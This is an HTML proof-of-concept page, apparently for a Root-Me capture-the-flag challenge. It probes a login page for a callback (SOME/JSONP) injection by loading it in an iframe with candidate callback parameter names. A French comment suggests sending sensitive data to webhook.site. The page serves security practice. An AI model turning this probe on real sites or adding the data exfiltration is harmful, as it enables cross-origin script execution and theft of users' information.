<!DOCTYPE html>
<html>
<head>
  <title>Test SOME exploit</title>
</head>
<body>

<h1>Testing callback injection</h1>

<script>
  // Fonction qu'on voudrait exécuter dans le contexte de la cible
  function alertTest() {
    alert("✅ La fonction callback a été appelée dans la page cible !");
    // Ici tu pourrais faire fetch vers webhook.site avec des infos sensibles
  }
</script>

<!-- Iframe avec l'URL cible + paramètre callback -->
<iframe id="target" style="width:600px; height:400px;"></iframe>

<script>
  // Liste des noms de param callback courants à tester
  const callbacks = ["callback", "cb", "jsonp", "func"];

  // Fonction pour tester chaque paramètre callback
  function testCallbacks() {
    const iframe = document.getElementById("target");

    for (const cb of callbacks) {
      // Construire URL avec le param callback
      const url = `http://challenge01.root-me.org:58010/login?${cb}=alertTest`;

      console.log("Testing URL:", url);
      iframe.src = url;
      // Pause nécessaire pour voir les alertes en cas de succès
      break; // pour l'instant on teste un seul callback à la fois
    }
  }

  testCallbacks();
</script>

</body>
</html>
